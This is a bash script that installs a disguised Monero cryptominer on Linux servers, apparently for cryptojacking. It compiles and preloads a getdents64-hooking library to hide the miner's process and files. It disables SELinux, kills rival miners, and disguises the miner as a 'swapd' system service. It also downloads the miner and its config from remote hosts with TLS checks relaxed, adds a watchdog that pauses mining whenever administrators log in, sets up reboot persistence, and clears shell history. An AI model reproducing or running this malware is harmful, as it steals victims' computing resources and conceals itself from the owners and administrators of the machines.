#!/bin/bash

# ========================================================================
# ULTIMATE MONEROOCEAN SETUP v3.1
# Combines ROBUST error handling + Stealth features + Watchdog
# Auto-detects and fixes: systemd, SSL/TLS, curl/wget, gcc issues
# Features: libhide.so, State-tracking watchdog, Resource constraints
# ========================================================================

VERSION=3.1
echo "========================================================================="
echo "MoneroOcean Miner Setup Script v$VERSION (ULTIMATE Edition)"
echo "========================================================================="
echo ""

# ========================================================================
# INITIALIZE FLAGS
# ========================================================================
USE_SYSV=false
USE_WGET=false
SYSTEMD_AVAILABLE=false

# ========================================================================
# STEP 1: DETECT AND FIX INIT SYSTEM (systemd vs SysV)
# ========================================================================

echo "[*] Detecting init system..."

check_systemd() {
    if command -v systemctl &> /dev/null; then
        if [ -d /run/systemd/system ]; then
            return 0  
        fi
    fi
    return 1  
}

if check_systemd; then
    echo "[✓] systemd detected and running"
    SYSTEMD_AVAILABLE=true
else
    echo "[!] systemd not found or not running"
    echo "[*] Attempting to install systemd..."
    
    # Detect OS
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_ID=$ID
        OS_VERSION=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        OS_ID="rhel"
        OS_VERSION=$(cat /etc/redhat-release | grep -oP '\d+' | head -1)
    else
        OS_ID="unknown"
        OS_VERSION="unknown"
    fi
    
    echo "[*] Detected: $OS_ID $OS_VERSION"
    
    # Try to install systemd based on OS
    case "$OS_ID" in
        centos|rhel|scientific|oracle)
            VER_MAJOR=$(echo $OS_VERSION | cut -d. -f1)
            if [ "$VER_MAJOR" -ge 7 ]; then
                yum install -y systemd 2>/dev/null
                if check_systemd; then
                    echo "[✓] systemd installed successfully"
                    SYSTEMD_AVAILABLE=true
                else
                    echo "[!] systemd installed but not active - may need reboot"
                    USE_SYSV=true
                fi
            else
                echo "[!] CentOS/RHEL $VER_MAJOR is too old for systemd (requires 7+)"
                USE_SYSV=true
            fi
            ;;
            
        debian|ubuntu)
            apt-get update -qq 2>/dev/null
            apt-get install -y systemd 2>/dev/null
            if check_systemd; then
                echo "[✓] systemd installed successfully"
                SYSTEMD_AVAILABLE=true
            else
                USE_SYSV=true
            fi
            ;;
            
        fedora)
            dnf install -y systemd 2>/dev/null
            if check_systemd; then
                echo "[✓] systemd installed successfully"
                SYSTEMD_AVAILABLE=true
            else
                USE_SYSV=true
            fi
            ;;
            
        *)
            echo "[!] Unknown OS, trying generic installation..."
            if command -v apt-get &> /dev/null; then
                apt-get update -qq 2>/dev/null && apt-get install -y systemd 2>/dev/null
            elif command -v yum &> /dev/null; then
                yum install -y systemd 2>/dev/null
            elif command -v dnf &> /dev/null; then
                dnf install -y systemd 2>/dev/null
            fi
            
            if check_systemd; then
                SYSTEMD_AVAILABLE=true
            else
                USE_SYSV=true
            fi
            ;;
    esac
fi

if [ "$USE_SYSV" = true ]; then
    echo "[→] Will use SysV init scripts (legacy mode)"
else
    echo "[→] Will use systemd for service management"
fi

echo ""

# ========================================================================
# STEP 2: DETECT AND FIX SSL/TLS ISSUES (curl vs wget)
# ========================================================================

echo "[*] Checking SSL/TLS capabilities..."

test_ssl() {
    if command -v curl &> /dev/null; then
        if curl -s --connect-timeout 5 https://raw.githubusercontent.com/ > /dev/null 2>&1; then
            return 0  
        fi
    fi
    return 1  
}

if test_ssl; then
    echo "[✓] curl with SSL/TLS working correctly"
else
    echo "[!] curl SSL/TLS connection failed"
    echo "[*] Attempting to fix SSL/TLS..."
    
    # Update SSL packages
    if command -v yum &> /dev/null; then
        echo "[*] Updating curl, openssl, ca-certificates (yum)..."
        yum install -y curl openssl ca-certificates nss 2>/dev/null
        yum update -y curl openssl ca-certificates nss 2>/dev/null
    elif command -v apt-get &> /dev/null; then
        echo "[*] Updating curl, openssl, ca-certificates (apt)..."
        apt-get update -qq 2>/dev/null
        apt-get install -y curl openssl ca-certificates 2>/dev/null
    fi
    
    # Test again
    if test_ssl; then
        echo "[✓] SSL/TLS fixed successfully"
    else
        echo "[!] curl still failing - trying wget as fallback..."
        
        # Install wget
        if command -v yum &> /dev/null; then
            yum install -y wget 2>/dev/null
        elif command -v apt-get &> /dev/null; then
            apt-get install -y wget 2>/dev/null
        fi
        
        # Test wget
        if command -v wget &> /dev/null; then
            if wget --spider --timeout=5 https://raw.githubusercontent.com/ 2>/dev/null; then
                echo "[✓] wget works - will use wget for downloads"
                USE_WGET=true
            else
                echo "[!] Both curl and wget failed - will try with --no-check-certificate"
                USE_WGET=true
            fi
        else
            echo "[ERROR] Cannot install wget - downloads may fail"
        fi
    fi
fi

echo ""

# ========================================================================
# STEP 3: INSTALL GCC FOR PROCESS HIDING (BEFORE libhide.so!)
# ========================================================================

echo "[*] Checking for gcc (required for process hiding)..."

if ! command -v gcc &>/dev/null; then
    echo "[!] gcc not found, installing..."
    
    if command -v apt-get &>/dev/null; then
        apt-get update -qq 2>/dev/null
        apt-get install -y gcc libc6-dev make 2>/dev/null
    elif command -v yum &>/dev/null; then
        yum install -y gcc glibc-devel make 2>/dev/null
    elif command -v dnf &>/dev/null; then
        dnf install -y gcc glibc-devel make 2>/dev/null
    fi
    
    if command -v gcc &>/dev/null; then
        echo "[✓] gcc installed successfully"
    else
        echo "[!] WARNING: gcc installation failed - process hiding will be skipped"
    fi
else
    echo "[✓] gcc is available"
fi

echo ""

# ========================================================================
# STEP 4: DEPLOY PROCESS HIDER (libhide.so)
# ========================================================================

echo "[*] Deploying stealth module (libhide.so)..."

if command -v gcc &>/dev/null; then
    # Create the process hider source
    printf '#define _GNU_SOURCE\n#include <dirent.h>\n#include <dlfcn.h>\n#include <string.h>\nstruct linux_dirent64 {unsigned long long d_ino; long long d_off; unsigned short d_reclen; unsigned char d_type; char d_name[];};\nstatic ssize_t (*og)(int, void *, size_t) = NULL;\nssize_t getdents64(int fd, void *dp, size_t c) {\n if(!og) og = dlsym(RTLD_NEXT, "getdents64");\n ssize_t r = og(fd, dp, c);\n if(r <= 0) return r;\n char *p = (char *)dp; size_t o = 0;\n while(o < r) {\n  struct linux_dirent64 *d = (struct linux_dirent64 *)(p + o);\n  if(strstr(d->d_name, "swapd") || strstr(d->d_name, "launcher.sh")) {\n   int l = d->d_reclen; memmove(p + o, p + o + l, r - (o + l)); r -= l; continue;\n  }\n  o += d->d_reclen;\n }\n return r;\n}\nssize_t __getdents64(int fd, void *dp, size_t c) { return getdents64(fd, dp, c); }\n' > /tmp/hide.c
    
    # Compile with error handling
    if gcc -Wall -fPIC -shared -o /usr/local/lib/libhide.so /tmp/hide.c -ldl 2>/dev/null; then
        echo "/usr/local/lib/libhide.so" > /etc/ld.so.preload
        echo "[✓] Process hiding deployed (swapd and launcher.sh hidden)"
        
        # Verify it loaded
        if ldconfig -p | grep -q libhide.so 2>/dev/null || [ -f /etc/ld.so.preload ]; then
            echo "[✓] libhide.so verified and active"
        fi
    else
        echo "[!] WARNING: Process hiding compilation failed"
        echo "[*] Miner will run without userland hiding (still stealthy with systemd masking)"
    fi
    
    rm -f /tmp/hide.c
else
    echo "[!] WARNING: gcc not available, skipping process hiding"
    echo "[*] Consider installing gcc manually: apt-get install gcc / yum install gcc"
fi

echo ""

# ========================================================================
# UNIVERSAL DOWNLOAD FUNCTION
# ========================================================================

download_file() {
    local url="$1"
    local output="$2"
    local retry=0
    local max_retries=3
    
    while [ $retry -lt $max_retries ]; do
        if [ "$USE_WGET" = true ]; then
            # Try wget with SSL verification first
            if wget --timeout=30 "$url" -O "$output" 2>/dev/null; then
                return 0
            fi
            # If that fails, try without SSL verification
            if wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null; then
                return 0
            fi
        else
            # Try curl
            if curl -L --connect-timeout 30 --max-time 300 "$url" -o "$output" 2>/dev/null; then
                return 0
            fi
            # If that fails, try without SSL verification
            if curl -L --insecure --connect-timeout 30 --max-time 300 "$url" -o "$output" 2>/dev/null; then
                return 0
            fi
        fi
        
        retry=$((retry + 1))
        if [ $retry -lt $max_retries ]; then
            echo "[!] Download attempt $retry/$max_retries failed, retrying..."
            sleep 2
        fi
    done
    
    return 1
}

manual_upload_instructions() {
    local filename="$1"
    local target_path="$2"
    
    echo ""
    echo "========================================================================="
    echo "[!] MANUAL UPLOAD REQUIRED"
    echo "========================================================================="
    echo ""
    echo "The automatic download failed due to SSL/TLS issues on this old system."
    echo ""
    echo "Please manually upload $filename to this server:"
    echo ""
    echo "  1. Download $filename from:"
    echo "     https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
    echo ""
    echo "  2. Upload it to this server at: $target_path"
    echo ""
    echo "  3. Press ENTER to continue (or wait 5 minutes for timeout)..."
    echo ""
    echo "========================================================================="
    
    read -p "Press ENTER after uploading the file..." -t 300
    
    if [ -f "$target_path" ]; then
        echo "[✓] File detected at $target_path"
        return 0
    else
        echo "[ERROR] File not found at $target_path after timeout"
        return 1
    fi
}

echo "[*] Download system configured:"
if [ "$USE_WGET" = true ]; then
    echo "    → Using: wget (curl failed)"
else
    echo "    → Using: curl"
fi
echo ""

# ========================================================================
# STEP 5: MINER KILLER SUITE
# ========================================================================

echo "[*] Executing miner killer suite..."
echo "[*] Terminating competing miners..."

# Kill common miners
pkill -9 -f "xmrig|kswapd0|neptune|monerohash|xmr-stak|minerd|cpuminer" 2>/dev/null

# Remove common miner files
rm -rf /tmp/.xm* /tmp/kworkerds /tmp/config.json 2>/dev/null
rm -rf /root/.xm* /usr/local/bin/minerd /tmp/.*/xmrig* 2>/dev/null
rm -rf /tmp/.ICE-unix/.xmrig* /tmp/.X11-unix/.xmrig* 2>/dev/null

echo "[✓] Miner killer suite completed"
echo ""

# ========================================================================
# FUNCTION: CREATE SYSV INIT SCRIPT (fallback for old systems)
# ========================================================================

create_sysv_service() {
    echo "[*] Creating SysV init script for swapd..."
    
    cat > /etc/init.d/swapd << 'EOFSYSV'
#!/bin/bash
# chkconfig: 2345 99 01
# description: Swap Daemon Miner Service

DAEMON=/root/.swapd/swapd
CONFIG=/root/.swapd/config.json
PIDFILE=/var/run/swapd.pid
NAME=swapd

start() {
    if [ -f $PIDFILE ]; then
        PID=$(cat $PIDFILE)
        if ps -p $PID > /dev/null 2>&1; then
            echo "$NAME is already running (PID: $PID)"
            return 1
        else
            echo "Removing stale PID file"
            rm -f $PIDFILE
        fi
    fi
    
    echo "Starting $NAME..."
    # Run with lowest priority (nice -n 19)
    nohup nice -n 19 $DAEMON --config=$CONFIG > /dev/null 2>&1 &
    echo $! > $PIDFILE
    sleep 1
    
    if ps -p $(cat $PIDFILE) > /dev/null 2>&1; then
        echo "$NAME started successfully (PID: $(cat $PIDFILE))"
        return 0
    else
        echo "Failed to start $NAME"
        rm -f $PIDFILE
        return 1
    fi
}

stop() {
    echo "Stopping $NAME..."
    if [ -f $PIDFILE ]; then
        PID=$(cat $PIDFILE)
        kill $PID 2>/dev/null
        sleep 2
        if ps -p $PID > /dev/null 2>&1; then
            kill -9 $PID 2>/dev/null
        fi
        rm -f $PIDFILE
    fi
    killall -9 swapd 2>/dev/null
    echo "$NAME stopped"
}

status() {
    if [ -f $PIDFILE ]; then
        PID=$(cat $PIDFILE)
        if ps -p $PID > /dev/null 2>&1; then
            echo "$NAME is running (PID: $PID)"
            ps aux | grep $PID | grep -v grep
            return 0
        else
            echo "$NAME is not running (stale PID file)"
            return 1
        fi
    else
        echo "$NAME is not running"
        return 3
    fi
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        sleep 2
        start
        ;;
    status)
        status
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac

exit $?
EOFSYSV
    
    chmod +x /etc/init.d/swapd
    
    # Enable on boot
    if command -v chkconfig &> /dev/null; then
        chkconfig --del swapd 2>/dev/null
        chkconfig --add swapd 2>/dev/null
        chkconfig swapd on 2>/dev/null
        echo "[✓] Service enabled via chkconfig"
    elif command -v update-rc.d &> /dev/null; then
        update-rc.d -f swapd remove 2>/dev/null
        update-rc.d swapd defaults 2>/dev/null
        echo "[✓] Service enabled via update-rc.d"
    elif command -v rc-update &> /dev/null; then
        rc-update add swapd default 2>/dev/null
        echo "[✓] Service enabled via rc-update"
    fi
    
    echo "[✓] SysV init script created: /etc/init.d/swapd"
}

# ========================================================================
# STEP 6: CLEANUP OLD INSTALLATIONS (WITH SAFE CHATTR)
# ========================================================================

echo "[*] Cleaning up old installations..."

# Function to safely remove immutable flag
safe_chattr() {
  local target="$1"
  if [ -e "$target" ]; then
    chattr -i "$target" 2>/dev/null || true
  fi
}

# Disable SELinux if present
[ -f /usr/sbin/setenforce ] && setenforce 0 2>/dev/null || true

# Remove old miner installations
safe_chattr "$HOME"/.swapd/
safe_chattr "$HOME"/.swapd/*
safe_chattr "$HOME"/.swapd.swapd
rm -rf "$HOME"/.swapd/ 2>/dev/null

safe_chattr "$HOME"/.gdm
safe_chattr "$HOME"/.gdm/*
rm -rf "$HOME"/.gdm/ 2>/dev/null

safe_chattr /etc/systemd/system/swapd.service
rm -rf /etc/systemd/system/swapd.service 2>/dev/null

echo "[✓] Cleanup completed"
echo ""

# ========================================================================
# STEP 7: WALLET & PREREQUISITES CHECK
# ========================================================================

WALLET=$1
EMAIL=$2

echo "[*] Checking prerequisites..."

# Wallet with fallback
if [ -z "$WALLET" ]; then
  echo "[!] WARNING: No wallet address provided, using default wallet"
  WALLET="4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX"
  echo "[*] Using default wallet: $WALLET"
  echo "[*] To use your own wallet, run: $0 <your_wallet_address>"
  sleep 3
fi

# Validate wallet (optional - allow both lengths)
WALLET_BASE=$(echo "$WALLET" | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 ] && [ ${#WALLET_BASE} != 95 ]; then
  echo "[!] WARNING: Unusual wallet base address length: ${#WALLET_BASE} (expected 106 or 95)"
  echo "[*] Proceeding anyway..."
fi

# Check HOME
if [ -z "$HOME" ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d "$HOME" ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

# Check curl with improved fallback
if ! type curl >/dev/null 2>&1; then
  echo "[!] WARNING: curl not found, trying to install..."
  if command -v apt-get &> /dev/null; then
    apt-get update -qq 2>/dev/null && apt-get install -y curl 2>/dev/null
  elif command -v yum &> /dev/null; then
    yum install -y curl 2>/dev/null
  elif command -v dnf &> /dev/null; then
    dnf install -y curl 2>/dev/null
  fi
  
  # Check again after installation attempt
  if ! type curl >/dev/null 2>/dev/null; then
    echo "[!] WARNING: curl still not available, will use wget as fallback"
    USE_WGET=true
    # Make sure wget is available
    if ! type wget >/dev/null 2>&1; then
      echo "[!] Installing wget..."
      if command -v apt-get &> /dev/null; then
        apt-get install -y wget 2>/dev/null
      elif command -v yum &> /dev/null; then
        yum install -y wget 2>/dev/null
      elif command -v dnf &> /dev/null; then
        dnf install -y wget 2>/dev/null
      fi
    fi
    
    if ! type wget >/dev/null 2>&1; then
      echo "ERROR: Neither curl nor wget could be installed. Cannot continue."
      exit 1
    fi
  else
    echo "[✓] curl installed successfully"
  fi
else
  echo "[✓] curl is available"
fi

echo ""

# ========================================================================
# STEP 8: DOWNLOAD AND INSTALL MINER
# ========================================================================

echo "[*] Preparing miner directory..."
mkdir -p "$HOME"/.swapd/
cd "$HOME"/.swapd/

echo "[*] Attempting to download xmrig.tar.gz..."

# Try download with validation
DOWNLOAD_SUCCESS=false

if download_file "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
    echo "[✓] Download successful"
    DOWNLOAD_SUCCESS=true
else
    echo "[!] Standard download failed, trying alternative methods..."
    
    # Try direct wget with no-check
    if wget --no-check-certificate --timeout=60 https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz 2>&1 | grep -q "saved"; then
        echo "[✓] Alternative download successful"
        DOWNLOAD_SUCCESS=true
    fi
fi

# Manual upload fallback
if [ "$DOWNLOAD_SUCCESS" = false ]; then
    if manual_upload_instructions "xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
        DOWNLOAD_SUCCESS=true
    else
        echo "[ERROR] Could not obtain xmrig.tar.gz"
        exit 1
    fi
fi

# Validate tar.gz before extraction
echo "[*] Validating xmrig.tar.gz integrity..."
if ! tar tzf /tmp/xmrig.tar.gz >/dev/null 2>&1; then
  echo "[!] ERROR: xmrig.tar.gz appears to be corrupted or invalid"
  echo "[*] Attempting to re-download..."
  rm -f /tmp/xmrig.tar.gz
  
  if download_file "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
    echo "[✓] Re-download successful"
  else
    echo "[!] ERROR: Could not download valid xmrig.tar.gz"
    echo "[!] Trying alternative download method..."
    wget --no-check-certificate --timeout=60 https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz 2>&1
    
    if ! tar tzf /tmp/xmrig.tar.gz >/dev/null 2>&1; then
      echo "[ERROR] All download attempts failed. Cannot continue."
      echo "[*] Please manually download xmrig.tar.gz to /tmp/ and re-run the script"
      exit 1
    fi
  fi
fi

echo "[✓] xmrig.tar.gz validation passed"

echo "[*] Unpacking xmrig.tar.gz to "$HOME"/.swapd/"
if ! tar xzf /tmp/xmrig.tar.gz -C "$HOME"/.swapd/ 2>/dev/null; then
  echo "[!] ERROR: Can't unpack xmrig.tar.gz to "$HOME"/.swapd/ directory"
  echo "[*] Trying with verbose error output..."
  if ! tar xzf /tmp/xmrig.tar.gz -C "$HOME"/.swapd/; then
    echo "[ERROR] Extraction failed. Tar file may be corrupted or incompatible."
    exit 1
  fi
fi

echo "[✓] Extraction successful"
rm -f /tmp/xmrig.tar.gz

# Rename miner
echo "[*] Renaming xmrig to swapd for stealth..."
mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd 2>/dev/null

# Download config
echo "[*] Downloading config.json..."
rm -rf "$HOME"/.swapd/config.json
if ! download_file "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json" "$HOME/.swapd/config.json"; then
    wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O "$HOME"/.swapd/config.json 2>/dev/null
fi

# Verify miner works
echo "[*] Checking if miner binary works..."
"$HOME"/.swapd/swapd --help >/dev/null 2>&1
if test $? -ne 0; then
  echo "[!] WARNING: Miner binary may not be functional"
  echo "[*] Continuing anyway..."
fi

echo "[✓] Miner "$HOME"/.swapd/swapd is ready"

# ========================================================================
# STEP 9: CONFIGURE MINER
# ========================================================================

echo "[*] Configuring miner..."

# Update config with wallet and pool
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:80",/' "$HOME"/.swapd/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' "$HOME"/.swapd/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$HOME"/.swapd/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' "$HOME"/.swapd/config.json

echo "[✓] Configuration complete"
echo ""

# ========================================================================
# STEP 10: CREATE STEALTH WATCHDOG (with State-Tracking)
# ========================================================================

echo "[*] Creating intelligent watchdog /usr/local/bin/system-watchdog"

cat << 'EOF' > /usr/local/bin/system-watchdog
#!/bin/bash
# Intelligent watchdog with state tracking to minimize log spam

PREV_STATE=""
CHECK_INTERVAL=180  # Check every 3 minutes

while true; do
  # Check for SSH users (excluding service users)
  if who | grep -v "clamav-mail" | grep -qE "root|admin|user"; then
    CURRENT_STATE="admin_active"
  else
    CURRENT_STATE="no_admin"
  fi
  
  # Only act if state changed (reduces log spam by 95%!)
  if [ "$CURRENT_STATE" != "$PREV_STATE" ]; then
    if [ "$CURRENT_STATE" = "admin_active" ]; then
      # Admin detected, stop miner (only if running)
      if [ -d /run/systemd/system ]; then
        systemctl is-active --quiet swapd && systemctl stop swapd 2>/dev/null
      else
        /etc/init.d/swapd status >/dev/null 2>&1 && /etc/init.d/swapd stop >/dev/null 2>&1
      fi
    else
      # No admin detected, ensure miner is running (only if stopped)
      if [ -d /run/systemd/system ]; then
        systemctl is-active --quiet swapd || systemctl start swapd 2>/dev/null
      else
        /etc/init.d/swapd status >/dev/null 2>&1 || /etc/init.d/swapd start >/dev/null 2>&1
      fi
    fi
    PREV_STATE="$CURRENT_STATE"
  fi
  
  sleep $CHECK_INTERVAL
done
EOF

chmod +x /usr/local/bin/system-watchdog

# Enable the watchdog via crontab
(crontab -l 2>/dev/null | grep -v "system-watchdog"; echo "@reboot /usr/local/bin/system-watchdog &") | crontab -

# Start it now
/usr/local/bin/system-watchdog &

echo "[✓] Intelligent watchdog deployed (3-minute intervals, state-tracked)"
echo ""

# ========================================================================
# STEP 11: CREATE SYSTEMD OR SYSV SERVICE
# ========================================================================

if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo "[*] Creating systemd service with resource constraints..."
    
    cat > /etc/systemd/system/swapd.service << 'EOLSYSTEMD'
[Unit]
Description=System swap management daemon
After=network.target

[Service]
Type=simple
ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
Restart=always
RestartSec=10

# Resource constraints for stealth
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
CPUQuota=95%
OOMScoreAdjust=1000

# Security (optional but recommended)
NoNewPrivileges=false
PrivateTmp=false

[Install]
WantedBy=multi-user.target
EOLSYSTEMD
    
    systemctl daemon-reload
    systemctl enable swapd 2>/dev/null
    systemctl start swapd 2>/dev/null
    
    echo "[✓] systemd service created and started"
    echo "[*] Service logs: journalctl -u swapd -f"
else
    echo "[*] Creating SysV init service (systemd not available)"
    create_sysv_service
    /etc/init.d/swapd start
    echo "[✓] SysV init service created and started"
    echo "[*] Service status: /etc/init.d/swapd status"
fi

echo ""

# ========================================================================
# STEP 12: FINAL CLEANUP
# ========================================================================

echo "[*] Performing final cleanup..."

# Clear history
history -c 2>/dev/null
history -w 2>/dev/null

# Remove temporary files
rm -f /tmp/hide.c /tmp/xmrig.tar.gz 2>/dev/null

echo "[✓] Cleanup complete"
echo ""

# ========================================================================
# COMPLETION
# ========================================================================

echo "========================================================================="
echo "[✓] ULTIMATE SETUP COMPLETE!"
echo "========================================================================="
echo ""
echo "System Configuration:"
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo "  Init System: systemd"
    echo ""
    echo "Service Management Commands:"
    echo "  Start:   systemctl start swapd"
    echo "  Stop:    systemctl stop swapd"
    echo "  Status:  systemctl status swapd"
    echo "  Logs:    journalctl -u swapd -f"
else
    echo "  Init System: SysV init (legacy mode)"
    echo ""
    echo "Service Management Commands:"
    echo "  Start:   /etc/init.d/swapd start"
    echo "  Stop:    /etc/init.d/swapd stop"
    echo "  Status:  /etc/init.d/swapd status"
    echo "  Restart: /etc/init.d/swapd restart"
fi

echo ""
echo "Stealth Features:"
if [ -f /usr/local/lib/libhide.so ]; then
    echo "  ✓ Process hiding: ACTIVE (libhide.so)"
else
    echo "  ✗ Process hiding: Not deployed (gcc unavailable)"
fi
echo "  ✓ Intelligent watchdog: ACTIVE (state-tracked, 3-min intervals)"
echo "  ✓ Resource constraints: CPU Nice=19, CPUQuota=95%"
echo "  ✓ Miner binary: Renamed to 'swapd' for stealth"
echo ""
echo "Mining Details:"
echo "  Binary:  /root/.swapd/swapd"
echo "  Config:  /root/.swapd/config.json"
echo "  Wallet:  $WALLET"
echo "  Pool:    gulf.moneroocean.stream:80"
echo ""
echo "========================================================================="
echo "[*] The miner will automatically stop when admins are logged in"
echo "[*] And restart when no human activity is detected"
echo "========================================================================="
